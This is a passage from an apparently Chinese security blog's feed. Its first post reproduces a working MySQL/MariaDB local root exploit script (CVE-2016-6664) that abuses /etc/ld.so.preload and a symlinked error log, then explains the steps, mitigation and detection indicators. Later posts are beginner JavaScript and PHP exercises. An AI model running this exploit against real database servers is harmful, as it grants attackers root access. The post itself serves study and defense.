class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash -p</span><br><span class="line"># Usage:</span><br><span class="line"># ./mysql-chowned.sh path_to_error.log </span><br><span class="line">BACKDOORSH="/bin/bash"</span><br><span class="line">BACKDOORPATH="/tmp/mysqlrootsh"</span><br><span class="line">PRIVESCLIB="/tmp/privesclib.so"</span><br><span class="line">PRIVESCSRC="/tmp/privesclib.c"</span><br><span class="line">SUIDBIN="/usr/bin/sudo"</span><br><span class="line"></span><br><span class="line">function cleanexit {</span><br><span class="line">    # Cleanup </span><br><span class="line">    echo -e "\n[+] Cleaning up..."</span><br><span class="line">    rm -f $PRIVESCSRC</span><br><span class="line">    rm -f $PRIVESCLIB</span><br><span class="line">    rm -f $ERRORLOG</span><br><span class="line">    touch $ERRORLOG</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo -n &gt; /etc/ld.so.preload</span><br><span class="line">    fi</span><br><span class="line">    echo -e "\n[+] Job done. Exiting with code $1 \n"</span><br><span class="line">    exit $1</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function ctrl_c() {</span><br><span class="line">        echo -e "\n[+] Ctrl+C pressed"</span><br><span class="line">    cleanexit 0</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">#intro </span><br><span class="line">echo -e "\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"</span><br><span class="line">echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"</span><br><span class="line"></span><br><span class="line"># Args</span><br><span class="line">if [ $# -lt 1 ]; then</span><br><span class="line">    echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"</span><br><span class="line">    echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Priv check</span><br><span class="line"></span><br><span class="line">echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"</span><br><span class="line">id | grep -q mysql </span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Set target paths</span><br><span class="line">ERRORLOG="$1"</span><br><span class="line">if [ ! -f $ERRORLOG ]; then</span><br><span class="line">    echo -e "\n[!] The specified MySQL error log ($ERRORLOG) doesn't exist. Try again.\n"</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line">echo -e "\n[+] Target MySQL log file set to $ERRORLOG"</span><br><span class="line"></span><br><span class="line"># [ Active exploitation ]</span><br><span class="line"></span><br><span class="line">trap ctrl_c INT</span><br><span class="line"># Compile privesc preload library</span><br><span class="line">echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"</span><br><span class="line">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">       #include &lt;sys/types.h&gt;</span><br><span class="line">       #include &lt;sys/stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">uid_t geteuid(void) {</span><br><span class="line">    static uid_t  (*old_geteuid)();</span><br><span class="line">    old_geteuid = dlsym(RTLD_NEXT, "geteuid");</span><br><span class="line">    if ( old_geteuid() == 0 ) {</span><br><span class="line">        chown("$BACKDOORPATH", 0, 0);</span><br><span class="line">        chmod("$BACKDOORPATH", 04777);</span><br><span class="line">        //unlink("/etc/ld.so.preload");</span><br><span class="line">    }</span><br><span class="line">    return old_geteuid();</span><br><span class="line">}</span><br><span class="line">_solibeof_</span><br><span class="line">/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."</span><br><span class="line">    cleanexit 2;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Prepare backdoor shell</span><br><span class="line">cp $BACKDOORSH $BACKDOORPATH</span><br><span class="line">echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"</span><br><span class="line"></span><br><span class="line"># Safety check</span><br><span class="line">if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">    echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Symlink the log file to /etc</span><br><span class="line">rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."</span><br><span class="line">    cleanexit 3</span><br><span class="line">fi</span><br><span class="line">echo -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"</span><br><span class="line"></span><br><span class="line"># Wait for MySQL to re-open the logs</span><br><span class="line">echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"</span><br><span class="line">echo -n "Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "</span><br><span class="line">read THE_ANSWER</span><br><span class="line">if [ "$THE_ANSWER" = "y" ]; then</span><br><span class="line">    echo -e "Got it. Executing 'killall mysqld' now..."</span><br><span class="line">    killall mysqld</span><br><span class="line">fi</span><br><span class="line">while :; do </span><br><span class="line">    sleep 0.1</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">        rm -f $ERRORLOG</span><br><span class="line">        break;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"># Inject the privesc.so shared library to escalate privileges</span><br><span class="line">echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">echo -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"</span><br><span class="line">echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"</span><br><span class="line">echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"</span><br><span class="line">chmod 755 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><br><span class="line">echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"</span><br><span class="line">sudo 2&gt;/dev/null &gt;/dev/null</span><br><span class="line"></span><br><span class="line">#while :; do </span><br><span class="line">#    sleep 0.1</span><br><span class="line">#    ps aux | grep mysqld | grep -q 'log-error'</span><br><span class="line">#    if [ $? -eq 0 ]; then</span><br><span class="line">#        break;</span><br><span class="line">#    fi</span><br><span class="line">#done</span><br><span class="line"></span><br><span class="line"># Check for the rootshell</span><br><span class="line">ls -l $BACKDOORPATH</span><br><span class="line">ls -l $BACKDOORPATH | grep rws | grep -q root</span><br><span class="line">if [ $? -eq 0 ]; then </span><br><span class="line">    echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"</span><br><span class="line">    echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"</span><br><span class="line">else</span><br><span class="line">    echo -e "\n[!] Failed to get root"</span><br><span class="line">    cleanexit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Execute the rootshell</span><br><span class="line">echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"</span><br><span class="line">$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"</span><br><span class="line">$BACKDOORPATH -p -i</span><br><span class="line"></span><br><span class="line"># Job done.</span><br><span class="line">cleanexit 0</span><br></pre></td></tr></tbody></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>​    1.) 提权失败<br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091808433.png" alt="image-20220409180808365"><br>如果提权失败, 那么需要将容器里面 <code>/etc/ld.so.preload</code> 文件删除, 删除前记得做一个备份, <code>cp /etc/ld.so.preload /etc/ld.so.preload.upback</code> 然后删除 <code>rm -rf /etc/ld.so.preload</code> 或者也可以使用 <code>mv /etc/ld.so.preload /etc/ld.so.preload.upback</code> 直接重命名. 再次回到提权失败的地方重新运行脚本就可以成功了. </p><h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h3><h3 id="1-ld-so-preload"><a href="#1-ld-so-preload" class="headerlink" title="1. ld.so.preload"></a>1. ld.so.preload</h3><p>要理解这个漏洞的利需要首先了解/etc/ld.so.preload这个文件的作用。</p><p>这个文件的作用和LD_PRELOAD这个环境变量的作用类似：</p><p>用以指定预先装载的一些共享库或目标文件，且无论程序是否依赖这些共享库或者文件，指定的这些文件都会被装载。但是两者的区别在于LD_PRELOAD被做了限制，对于suid的程序这种预先装载目标库的功能可能会导致权限提升，所以对于suid的程序加载动态链接库时是会忽略LD_PRELOAD的。但是/etc/ld.so.preload这个配置文件却不存在这种限制。</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 参考资料4(https://minipli.wordpress.com/2009/07/17/ld_preload-vs-etcld-so-preload/)中是这么说的:</span></span><br><span class="line">LD_PRELOAD was evil <span class="keyword">when</span> combined <span class="keyword">with</span> suid binaries so it will be ignored <span class="keyword">by</span> the loader. That’s because otherwise you could abuse those binaries to raise your privileges <span class="keyword">by</span> preloading some code that spawns a shell — e.g. <span class="keyword">by</span> hooking __libc_start_main(). However, <span class="function">those restrictions <span class="keyword">do</span> <span class="keyword">not</span> apply <span class="keyword">for</span> <span class="keyword">this</span> <span class="title">file</span>(<span class="params">/etc/ld.so.preload</span>). The loader will bravely load the shared objects listed <span class="keyword">in</span> /etc/ld.so.preload even <span class="keyword">for</span> suid binaries.</span></span><br></pre></td></tr></tbody></table></figure><p>在此漏洞利用过程中ld.so.preload文件中的内容为攻击者自己编译的so文件: /tmp/privesclib.so</p><p>攻击者在/tmp/privesclib.so中自定义了geteuid函数，这个函数会在suid的程序(如sudo)中被调用</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -o sudo.txt sudo</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091813322.png" alt="img"></p><p>攻击者设置预先加载其定义so库，会导致geteuid函数被覆盖掉，当sudo调用geteuid时实际上调用的是攻击者自定义函数，可以达到一种类似hook的效果。</p><p>/etc目录只有root可写，所以要借助mysqld_safe进程创建ld.so.preload文件(mysqld_safe进程是以root权限运行的)</p><h3 id="2-漏洞利用过程"><a href="#2-漏洞利用过程" class="headerlink" title="2. 漏洞利用过程"></a>2. 漏洞利用过程</h3><p>简单梳理一下漏洞利用过程，主要分为一下几步：（可以结合poc一起看会比较清晰）</p><ol><li>准备工作：<ol><li>cp /bin/bash /tmp/mysqlrootsh</li><li>编译攻击者自定义so</li></ol></li><li>删除error.log（需要mysql权限），并新建符号链接 ln -s /etc/ld.so.preload /var/log/mysql/error.log , error.log为符号链接文件，指向一个现在不存在的ld.so.preload文件（这种情况下判断error.log是否存在，结果是不存在的，并且touch error.log的结果是新建一个ld.so.preload文件）</li><li>杀掉mysqld进程，mysqld_safe检测到mysqld进程死掉了，会重启它，在重启的过程中检查error.log是否存在，因为刚刚error.log被换为了符号链接，所以mysqld_safe认为其不存在，然后touch error.log，结果攻击者成功借助mysqld_safe的root权限新建了ld.so.preload文件</li><li>mysqld_safe进程执行chown mysql error.log ,因为error.log是符号链接，所以ld.so.preload的owner被改为mysql</li><li>echo ‘/tmp/privesclib.so’ &gt; /etc/ld.so.preload (攻击者有mysql权限，并且ld.so.preload的owner为mysql)</li><li>执行sudo, geteuid被调用，/tmp/mysqlrootsh权限的owner和group被改为root, 权限被改为04777</li><li>执行mysqlrootsh拿到root权限</li></ol><h3 id="3-漏洞-利用模型抽象"><a href="#3-漏洞-利用模型抽象" class="headerlink" title="3. 漏洞/利用模型抽象"></a>3. 漏洞/利用模型抽象</h3><p>漏洞原因用一句话总结就是:</p><p>root权限进程对文件进行敏感操作（touch/chown），被操作文件可被攻击者(非root用户)访问并换为攻击者可控文件(符号链接)，攻击者精心构造文件获得root权限</p><h3 id="4-应急响应"><a href="#4-应急响应" class="headerlink" title="4. 应急响应"></a>4. 应急响应</h3><ol><li>该漏洞的利用建立在CVE-2016-6663的基础之上，所以建议修补6663漏洞防止攻击者进一步对服务器造成危害。</li><li>短期内可使用syslog代替默认的error log，等待官方补丁</li></ol><p>攻击检测：</p><ol><li>检查mysql版本是否在存在漏洞的版本范围内</li><li>查看mysql是否开启syslog</li><li>检测是否存在/etc/ld.so.preload,/tmp/privesclib.so,/tmp/privesclib.c, /tmp/mysqlrootsh等文件</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;复现MySQL-CVE-2016-6663-amp-CVE-2016-6664-组合提权&quot;&gt;&lt;a href=&quot;#复现MySQL-CVE-2016-6663-amp-CVE-2016-6664-组合提权&quot; class=&quot;headerlink&quot; title=&quot;复现My</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://aisibuhuipao.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>linux常用命令</title>
    <link href="http://aisibuhuipao.github.io/2022/01/04/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://aisibuhuipao.github.io/2022/01/04/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-01-04T11:45:38.000Z</published>
    <updated>2022-01-04T11:45:38.000Z</updated>
    
    <content type="html"><![CDATA[<p> 转载 by <a href="https://github.com/rd2coding/Road2Coding">CodeSheep</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/1.jpg" alt="1"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/2.jpg" alt="2"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/3.jpg" alt="3"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/4.jpg" alt="4"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/5.jpg" alt="5"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/6.jpg" alt="6"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/7.jpg" alt="7"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/8.jpg" alt="8"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/9.jpg" alt="9"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/10.jpg" alt="10"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/11.jpg" alt="11"></p><p><img src="../../../img/13.jpg" alt="12"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/12-16412969959801.jpg" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 转载 by &lt;a href=&quot;https://github.com/rd2coding/Road2Coding&quot;&gt;CodeSheep&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/aisibuhuipao/i</summary>
      
    
    
    
    
    <category term="linux" scheme="http://aisibuhuipao.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>水仙花数-九九乘法表</title>
    <link href="http://aisibuhuipao.github.io/2021/12/31/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/"/>
    <id>http://aisibuhuipao.github.io/2021/12/31/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/</id>
    <published>2021-12-31T01:00:34.000Z</published>
    <updated>2021-12-31T01:00:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>水仙花数-1</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = prompt(<span class="string">'请输入一个数字：'</span>);</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">parseInt</span>(num /<span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">parseInt</span>(num %<span class="number">100</span> / <span class="number">10</span> );</span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">parseInt</span>(num % <span class="number">100</span> % <span class="number">10</span>);</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">Math</span>.pow(a,<span class="number">3</span>)+<span class="built_in">Math</span>.pow(b,<span class="number">3</span>)+<span class="built_in">Math</span>.pow(c,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">parseInt</span>(num) == s &amp;&amp; s != <span class="number">0</span>){</span><br><span class="line">     <span class="built_in">console</span>.log(num + <span class="string">'这个数字是水仙花数'</span>);</span><br><span class="line"> }<span class="keyword">else</span> <span class="keyword">if</span>(num &lt; <span class="number">100</span>) {</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"请输入3位数"</span>)</span><br><span class="line"> }<span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这不是水仙花数'</span>)</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = prompt(<span class="string">'请输入一个数字：'</span>);</span><br><span class="line"><span class="keyword">var</span> n1 = <span class="built_in">parseInt</span>(num[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">var</span> n2 = <span class="built_in">parseInt</span>(num[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">var</span> n3 = <span class="built_in">parseInt</span>(num[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(n1,n2,n3);</span><br><span class="line"><span class="keyword">var</span> s = (n1*n1*n1)+(n2*n2*n2)+(n3*n3*n3);</span><br><span class="line"><span class="built_in">console</span>.log(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">parseInt</span>(num) == s &amp;&amp; s != <span class="number">0</span>){</span><br><span class="line">    <span class="built_in">console</span>.log(num + <span class="string">'这个数字是水仙花数'</span>);</span><br><span class="line">}<span class="keyword">else</span> <span class="keyword">if</span>(num &lt; <span class="number">100</span>) {</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"请输入3位数"</span>)</span><br><span class="line">}<span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这不是水仙花数'</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>水仙花数-for</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//100- 1000 以内的水仙花数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;i++){</span><br><span class="line">    <span class="keyword">var</span> a,b,c</span><br><span class="line">    a = <span class="built_in">parseInt</span>(i/<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//document.write('&lt;br&gt;');</span></span><br><span class="line">    b = <span class="built_in">parseInt</span>(i%<span class="number">100</span>/<span class="number">10</span>);</span><br><span class="line">    <span class="comment">//document.write('&lt;br&gt;');</span></span><br><span class="line">    c = <span class="built_in">parseInt</span>(i%<span class="number">10</span>);</span><br><span class="line">   <span class="comment">//document.write(a,b,c);</span></span><br><span class="line">   <span class="comment">//document.write('&lt;br&gt;');</span></span><br><span class="line">    result = <span class="built_in">Math</span>.pow(a,<span class="number">3</span>) + <span class="built_in">Math</span>.pow(b,<span class="number">3</span>) + <span class="built_in">Math</span>.pow(c,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">//document.write(result);</span></span><br><span class="line">    <span class="keyword">if</span> (result === i){</span><br><span class="line">        <span class="built_in">document</span>.write(i);</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>九九乘法表-for</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++){</span><br><span class="line">        <span class="comment">//document.write(i)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++){</span><br><span class="line">            <span class="built_in">document</span>.write(j + <span class="string">'x'</span> + i + <span class="string">'='</span> + (i*j))</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>九九乘法表-for-if</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++){</span><br><span class="line">        <span class="comment">//document.write(i)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++){</span><br><span class="line">            <span class="built_in">document</span>.write(j + <span class="string">'x'</span> + i + <span class="string">'='</span> + (i*j))</span><br><span class="line">            <span class="keyword">if</span>(j==i){</span><br><span class="line">               <span class="built_in">document</span>.write(<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//document.write('&lt;br&gt;')</span></span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>冒泡排序，给两个数然后输出最大的数</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line"><span class="comment">//冒泡排序,给两个数,然后输出最大的数</span></span><br><span class="line">    <span class="comment">//var all = [5,3,7,1,8,2,10,4,6,9]</span></span><br><span class="line">    <span class="keyword">var</span> all = [<span class="number">45</span>,<span class="number">23</span>,<span class="number">76</span>,<span class="number">35</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">64</span>,<span class="number">99</span>,<span class="number">57</span>] <span class="comment">// 0-8位长度</span></span><br><span class="line">    <span class="comment">//var all = Math.random(1,100)</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;all.length-<span class="number">1</span>;i++){    <span class="comment">//控制遍历比较的次数，最后的位置不用每次遍历，减1</span></span><br><span class="line">                <span class="comment">//document.write(all)</span></span><br><span class="line">                <span class="comment">//document.write('---------------------&lt;br&gt;')</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> a=<span class="number">0</span>;a&lt;all.length-<span class="number">1</span>-i;a++){  <span class="comment">//控制每一次遍历的次数</span></span><br><span class="line">            <span class="keyword">if</span>(all[a] &gt; all[a-<span class="number">1</span>] ) {    <span class="comment">//调换数组位置</span></span><br><span class="line">                <span class="keyword">var</span> result = all[a]</span><br><span class="line">                all[a] = all[a-<span class="number">1</span>]</span><br><span class="line">                all[a-<span class="number">1</span>] = result</span><br><span class="line">            <span class="comment">//document.write(all)</span></span><br><span class="line">            <span class="comment">//document.write('&lt;br&gt;')</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">      </span><br><span class="line">        <span class="comment">// var result = all[i] &lt; all[i+1]</span></span><br><span class="line">        <span class="comment">// document.write(result)</span></span><br><span class="line">        <span class="comment">// document.write('&lt;br&gt;')}</span></span><br><span class="line">    }</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'----------------------------&lt;br&gt;'</span>)</span><br><span class="line"><span class="built_in">document</span>.write(all)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>水仙花数-php-for</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">100</span>; <span class="variable">$i</span> &lt; <span class="number">1000</span>; <span class="variable">$i</span>++) {</span><br><span class="line"><span class="comment">// 字符串转换为int类型的时候，不能使用int()，需要使用 intval()</span></span><br><span class="line"><span class="variable">$a</span> = intval(<span class="variable">$i</span>/<span class="number">100</span>);</span><br><span class="line"><span class="variable">$b</span> = intval(<span class="variable">$i</span>%<span class="number">100</span>/<span class="number">10</span>);</span><br><span class="line"><span class="variable">$c</span> = intval(<span class="variable">$i</span>%<span class="number">10</span>);</span><br><span class="line"><span class="comment">//$result = ($a*$a*$a)+($b*$b*$b)+($c*$c*$c);</span></span><br><span class="line"><span class="variable">$result</span> = pow(<span class="variable">$a</span>, <span class="number">3</span>) + pow(<span class="variable">$b</span>, <span class="number">3</span>) + pow(<span class="variable">$c</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">//$result = pow($a,3);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> == <span class="variable">$i</span>) {</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>水仙花数-php-for-2</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">100</span>;<span class="variable">$i</span>&lt;=<span class="number">1000</span>;<span class="variable">$i</span>++){</span><br><span class="line"><span class="comment">// 将字符串分割为数组取值</span></span><br><span class="line"><span class="variable">$r</span> = str_split(<span class="variable">$i</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$r</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$r</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$r</span>[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//$result = 